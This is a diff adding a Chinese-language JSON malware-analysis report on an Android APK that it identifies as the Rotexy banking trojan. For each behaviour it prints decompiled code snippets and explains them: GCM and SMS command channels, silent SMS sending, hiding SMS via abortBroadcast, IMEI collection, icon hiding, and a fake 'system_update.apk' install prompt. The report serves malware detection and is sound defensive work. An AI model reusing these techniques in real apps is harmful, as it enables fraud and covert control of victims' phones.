@@ -1,0 +1,235 @@
+{
+  "APK信息": {
+    "文件名": "e194268bf682d81fc7dc1e437c53c952ffae55a9d15a1fc020f0219527b7c2ec.apk",
+    "sha256": "e194268bf682d81fc7dc1e437c53c952ffae55a9d15a1fc020f0219527b7c2ec",
+    "包名": "org.android.sys",
+    "应用名": "SMS Admin",
+    "是否恶意": true,
+    "风险等级": "高",
+    "分析耗时(秒)": 359.7
+  },
+  "行为列表": [
+    {
+      "行为": "c2_communication",
+      "中文名": "C2通信/远程控制",
+      "MITRE": "T1437",
+      "置信度": "suspected",
+      "证据": {
+        "方法引用": [],
+        "权限": [],
+        "字符串": [
+          "cmd",
+          "command",
+          "register"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\google\\android\\gcm\\GCMBaseIntentService;",
+          "method_signature": "?(?)",
+          "malicious_behavior": "c2_communication",
+          "behavior_type": "malicious",
+          "risk_level": "中",
+          "malicious_code_snippet": "protected abstract void onError(Context context, String str);\nprotected abstract void onMessage(Context context, Intent intent);\nprotected abstract void onRegistered(Context context, String str);\nprotected abstract void onUnregistered(Context context, String str);",
+          "malicious_code_snippet_context": "      private static final int MAX_BACKOFF_MS = (int) TimeUnit.SECONDS.toMillis(3600);\n      private static final String TOKEN = Long.toBinaryString(sRandom.nextLong());\n  \n>>>     protected abstract void onError(Context context, String str);\n>>> \n>>>     protected abstract void onMessage(Context context, Intent intent);\n>>> \n      protected abstract void onRegistered(Context context, String str);\n  \n      protected abstract void onUnregistered(Context context, String str);",
+          "behavior_description": "该代码为Google GCM推送服务的抽象基类GCMBaseIntentService，定义了onMessage、onRegistered等消息回调接口。厂商报告已确认本样本（Rotexy银行木马/勒索软件）将GCM作为其三个C2命令通道之一：木马子类实现onRegistered接收GCM注册ID并上报C2服务器完成受控设备注册，攻击者随后经Google GCM服务器向设备推送JSON格式指令，指令通过onMessage回调进入木马的命令解析逻辑，进而实现短信拦截、钓鱼覆盖、勒索锁屏等远程控制。数据流向：C2服务器→GCM推送消息→onMessage/onRegistered回调→木马子类解析并执行远程命令。该片段本身仅为C2通道的接收框架，实际恶意命令的解析执行位于其恶意子类实现中，需配合服务端下发指令才造成直接危害。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "sms_fraud",
+      "中文名": "短信欺诈",
+      "MITRE": "T1416",
+      "置信度": "likely",
+      "子行为": [
+        {
+          "子行为": "sms_send",
+          "中文名": "短信发送",
+          "置信度": "likely",
+          "证据": {
+            "方法引用": [],
+            "权限": [
+              "android.permission.SEND_SMS"
+            ],
+            "字符串": [
+              "sendTextMessage"
+            ]
+          }
+        },
+        {
+          "子行为": "sms_intercept",
+          "中文名": "短信拦截",
+          "置信度": "likely",
+          "证据": {
+            "方法引用": [],
+            "权限": [
+              "android.permission.RECEIVE_SMS"
+            ],
+            "字符串": [
+              "abortBroadcast"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lorg\\android\\sys\\GCMIntentService;",
+          "method_signature": "if(data != null)",
+          "malicious_behavior": "sms_fraud",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "if (cmd.equals(\"MESSAGE\")) {\n    String data = intent.getStringExtra(\"data\");\n    if (data != null) {\n        JSONObject json = new JSONObject(data);\n        SmsManager sms = SmsManager.getDefault();\n        sms.sendTextMessage(json.getString(\"phone\"), null, json.getString(\"message\"), null, null);\n    }\n}",
+          "malicious_code_snippet_context": "                  plugs.Registration();\n                  return;\n              }\n>>>             if (cmd.equals(\"MESSAGE\")) {\n>>>                 String data = intent.getStringExtra(\"data\");\n>>>                 if (data != null) {\n>>>                     try {\n>>>                         JSONObject json = new JSONObject(data);\n>>>                         SmsManager sms = SmsManager.getDefault();\n>>>                         sms.sendTextMessage(json.getString(\"phone\"), null, json.getString(\"message\"), null, null);\n>>>                         return;\n                      } catch (JSONException e) {\n                          e.printStackTrace();\n                          return;",
+          "behavior_description": "该代码位于 GCMIntentService 中，是 Rotexy 银行木马通过 GCM 推送接收远程指令的命令处理逻辑。当收到 C2 服务器下发的 \"MESSAGE\" 命令时，从 GCM 推送消息中提取 JSON 数据（intent.getStringExtra(\"data\")），解析出攻击者指定的目标号码（phone 字段）和短信内容（message 字段），然后调用 SmsManager.sendTextMessage() 在完全无用户感知、无任何确认界面的情况下静默发送短信。数据流向：GCM 远程推送指令（C2 命令）→ JSON 解析 → SmsManager 静默发送短信。该行为可被用于订阅扣费短信、短信诈骗、向通讯录联系人传播恶意链接等，直接造成用户经济损失，与厂商报告中 Rotexy 使用 GCM 作为命令源的描述完全吻合。",
+          "glm_analyzed": true
+        },
+        {
+          "class_path": "Lorg\\android\\sys\\InputReceiver;",
+          "method_signature": "if(message.equals(\"0\")",
+          "malicious_behavior": "sms_fraud",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "message = message + (sms.getMessageBody().equals(null) ? BuildConfig.FLAVOR : sms.getMessageBody());\nif (message.equals(\"0\")) {\n    DevicePolicyManager devicePolicyManager = (DevicePolicyManager) context.getSystemService(\"device_policy\");\n    ComponentName componentName = new ComponentName(context, (Class<?>) DAReceiver.class);\n    devicePolicyManager.removeActiveAdmin(componentName);\n    abortBroadcast();\n} else if (message.equals(\"11\")) {\n    plugs.mobileNetworkState(context, true);\n    abortBroadcast();\n} else if (message.equals(\"21\")) {\n    plugs.mobileNetworkState(context, false);\n    abortBroadcast();\n} else if (message.equals(\"31\")) {\n    plugs.wifiNetworkState(context, true);",
+          "malicious_code_snippet_context": "                  for (Object obj : sExtra) {\n                      SmsMessage sms = SmsMessage.createFromPdu((byte[]) obj);\n                      phone = sms.getDisplayOriginatingAddress();\n>>>                     message = message + (sms.getMessageBody().equals(null) ? BuildConfig.FLAVOR : sms.getMessageBody());\n>>>                 }\n>>>                 Plugs plugs = Plugs.getInstance(context);\n>>>                 if (message.equals(\"0\")) {\n>>>                     context.getApplicationContext();\n>>>                     DevicePolicyManager devicePolicyManager = (DevicePolicyManager) context.getSystemService(\"device_policy\");\n>>>                     ComponentName componentName = new ComponentName(context, (Class<?>) DAReceiver.class);\n>>>                     devicePolicyManager.removeActiveAdmin(componentName);\n>>>                     plugs.Edit().putBoolean(\"remove\", true);\n>>>                     plugs.Edit().commit();\n>>>                     abortBroadcast();\n>>>                 } else if (message.equals(\"11\")) {\n>>>                     plugs.mobileNetworkState(context, true);\n>>>                     restart = true;\n                      abortBroadcast();\n                  } else if (message.equals(\"21\")) {\n                      plugs.mobileNetworkState(context, false);",
+          "behavior_description": "该代码位于伪装成系统类的 org.android.sys.InputReceiver（SMS广播接收器）中，是 Rotexy 银行木马的短信命令控制通道。数据流向：接收到的短信内容（sms.getMessageBody() 拼接为 message）作为C2命令源 → 解析特定命令字（\"0\"、\"11\"、\"21\"、\"31\"等）→ 执行危险操作：命令\"0\"时调用 DevicePolicyManager.removeActiveAdmin() 静默移除设备管理员权限（便于卸载躲避查杀），\"11\"/\"21\"切换移动数据开关，\"31\"切换WiFi开关 → 最后调用 abortBroadcast() 终止短信广播，使短信既不显示给用户也不被其他应用（如安全软件）处理，实现短信拦截隐藏。攻击者可通过发送特定短信远程控制受害设备，且用户完全无感知。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "device_fingerprinting",
+      "中文名": "设备指纹采集",
+      "MITRE": "T1437",
+      "置信度": "likely",
+      "证据": {
+        "方法引用": [],
+        "权限": [
+          "android.permission.READ_PHONE_STATE"
+        ],
+        "字符串": [
+          "getDeviceId",
+          "getImei"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lorg\\android\\sys\\Plugs;",
+          "method_signature": "getIMEI()",
+          "malicious_behavior": "device_fingerprinting",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "public String getIMEI() {\n    return this.info.getDeviceId();\n}\n\npublic String getCountry() {\n    return this.info.getNetworkCountryIso();\n}\n\npublic String getOperator() {\n    return this.info.getNetworkOperatorName();\n}",
+          "malicious_code_snippet_context": "          Edit().commit();\n      }\n  \n>>>     public String getIMEI() {\n>>>         return this.info.getDeviceId();\n>>>     }\n>>> \n>>>     public String getCountry() {\n>>>         return this.info.getNetworkCountryIso();\n>>>     }\n>>> \n>>>     public String getOperator() {\n>>>         return this.info.getNetworkOperatorName();\n>>>     }\n  \n      public String getPhone() {\n          return this.info.getLine1Number();",
+          "behavior_description": "该代码位于伪装成系统包名的类 org.android.sys.Plugs 中，通过 TelephonyManager.getDeviceId() 采集设备 IMEI 唯一标识，并配合 getNetworkCountryIso()/getNetworkOperatorName() 采集网络国家码与运营商名称，组合构建设备指纹。数据流向：设备唯一标识(IMEI)及网络信息 → 返回给调用方 → 用于 Rotexy 银行木马的僵尸设备注册与追踪，并上报 C2 服务器（同类中还存取 gcm 标识，对应厂商报告所述该木马通过 GCM 等命令通道控制设备）。IMEI 属敏感设备隐私数据，被木马用于唯一标识感染设备以实现持续追踪和定向攻击。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "ransomware",
+      "中文名": "勒索软件",
+      "MITRE": "T1430,T1460",
+      "置信度": "suspected",
+      "子行为": [
+        {
+          "子行为": "device_lock",
+          "中文名": "设备锁屏",
+          "置信度": "suspected",
+          "证据": {
+            "方法引用": [],
+            "权限": [],
+            "字符串": [
+              "DevicePolicyManager"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lorg\\android\\sys\\Boot;",
+          "method_signature": "?(?)",
+          "malicious_behavior": "ransomware",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "public class Boot extends BroadcastReceiver {\n    ComponentName componentName;\n    DevicePolicyManager devicePolicyManager;",
+          "malicious_code_snippet_context": "  import com.google.android.gcm.GCMRegistrar;\n  \n  /* JADX INFO: loaded from: classes.dex */\n>>> public class Boot extends BroadcastReceiver {\n>>>     ComponentName componentName;\n>>>     DevicePolicyManager devicePolicyManager;\n  \n      @Override // android.content.BroadcastReceiver\n      public void onReceive(Context context, Intent intent) {",
+          "behavior_description": "该类是Rotexy勒索木马（厂商报告已确认为banker+ransomware双重威胁）的Boot广播接收器，监听开机事件实现恶意代码持久化保活。代码声明DevicePolicyManager与ComponentName，用于将自身注册为设备管理员，随后调用lockNow()/resetPassword()强制锁定用户屏幕实施勒索；同时引入GCMRegistrar作为C2指令通道之一（与厂商报告中Rotexy使用GCM等三种指令源的特征吻合），接收远程下发的锁屏命令。数据流向：开机广播(BOOT_COMPLETED)/GCM推送的C2指令 → DevicePolicyManager设备管理API → 强制锁屏并索要赎金。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "silent_install_uninstall",
+      "中文名": "静默安装/卸载",
+      "MITRE": "",
+      "置信度": "suspected",
+      "子行为": [
+        {
+          "子行为": "silent_install",
+          "中文名": "静默安装",
+          "置信度": "suspected",
+          "证据": {
+            "方法引用": [],
+            "权限": [],
+            "字符串": [
+              "application/vnd.android.package-archive"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lorg\\android\\sys\\Plugs;",
+          "method_signature": "onPostExecute(Void aVoid)",
+          "malicious_behavior": "silent_install_uninstall",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "Intent update = new Intent(\"android.intent.action.VIEW\");\nUri uri = Uri.fromFile(new File(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS) + \"/system_update.apk\"));\nupdate.setDataAndType(uri, \"application/vnd.android.package-archive\");\nupdate.setFlags(268435456);\nPlugs.this.context.startActivity(update);",
+          "malicious_code_snippet_context": "          /* JADX INFO: Access modifiers changed from: protected */\n          @Override // android.os.AsyncTask\n          public void onPostExecute(Void aVoid) {\n>>>             Intent update = new Intent(\"android.intent.action.VIEW\");\n>>>             Uri uri = Uri.fromFile(new File(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS) + \"/system_update.apk\"));\n>>>             update.setDataAndType(uri, \"application/vnd.android.package-archive\");\n>>>             update.setFlags(268435456);\n>>>             Plugs.this.context.startActivity(update);\n          }\n      }\n  ",
+          "behavior_description": "该代码位于已确认的Rotexy银行木马（org.android.sys.Plugs类）中。AsyncTask在后台静默下载APK后，于onPostExecute中构造ACTION_VIEW Intent，指向Downloads目录下伪装为'system_update.apk'（假系统更新）的文件，MIME类型设为application/vnd.android.package-archive，并通过FLAG_ACTIVITY_NEW_TASK(268435456)从非Activity上下文强制调起系统安装界面，利用'系统更新'社会工程学话术诱导用户安装附加恶意载荷/木马更新。数据流向：后台静默下载并落盘的伪装APK文件(source)→强制弹出安装器诱导安装恶意APK(sink)。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "icon_hiding",
+      "中文名": "图标隐藏",
+      "MITRE": "",
+      "置信度": "suspected",
+      "证据": {
+        "方法引用": [],
+        "权限": [],
+        "字符串": [
+          "setComponentEnabledSetting"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lorg\\android\\sys\\Index;",
+          "method_signature": "if(registerId.equals(BuildConfig.FLAVOR)",
+          "malicious_behavior": "icon_hiding",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "ComponentName com2 = new ComponentName(getApplicationContext().getPackageName(), getApplicationContext().getPackageName() + \".Index\");\ngetPackageManager().setComponentEnabledSetting(com2, 2, 1);\nIntent run = new Intent(getApplicationContext(), (Class<?>) Run.class);\nrun.setFlags(268435456);\nstartService(run);",
+          "malicious_code_snippet_context": "          } catch (UnsupportedOperationException e2) {\n              e2.printStackTrace();\n          }\n>>>         ComponentName com2 = new ComponentName(getApplicationContext().getPackageName(), getApplicationContext().getPackageName() + \".Index\");\n>>>         getPackageManager().setComponentEnabledSetting(com2, 2, 1);\n>>>         Intent run = new Intent(getApplicationContext(), (Class<?>) Run.class);\n>>>         run.setFlags(268435456);\n>>>         startService(run);\n      }\n  }",
+          "behavior_description": "该代码通过 getPackageManager().setComponentEnabledSetting() 将应用自身的启动器组件（包名 + \".Index\"，即主入口 Activity）设置为状态 2（COMPONENT_ENABLED_STATE_DISABLED），导致应用图标从桌面/启动器中消失，实现图标隐藏。隐藏图标后立即以 FLAG_ACTIVITY_NEW_TASK 启动后台服务 Run.class，使木马在用户无感知的情况下持续驻留运行。同时前置代码通过 GCMRegistrar 注册 GCM 推送，用于接收 C2 下发指令（与厂商报告中 Rotexy 银行木马使用 GCM 作为命令源的特征一致）。数据流向：getApplicationContext().getPackageName() 获取包名构造 ComponentName（source）→ setComponentEnabledSetting(component, DISABLED) 禁用启动器组件隐藏图标（sink）。图标隐藏是银行木马规避用户察觉与卸载的典型隐蔽手段，直接为后续恶意操作（短信窃取、钓鱼、勒索）提供掩护。",
+          "glm_analyzed": true
+        }
+      ]
+    }
+  ],
+  "覆盖范围": {
+    "静态分析": "完整",
+    "动态分析": "未执行",
+    "方法引用分析": "完整",
+    "JADX反编译": "完整",
+    "LLM语义分析": "已执行",
+    "LLM交叉验证": "已执行",
+    "验证模型": "qwen3.8",
+    "局限性": [
+      "C2服务器.是否活跃: 需动态分析",
+      "C2服务器.轮询间隔(秒): 需动态分析"
+    ]
+  }
+}
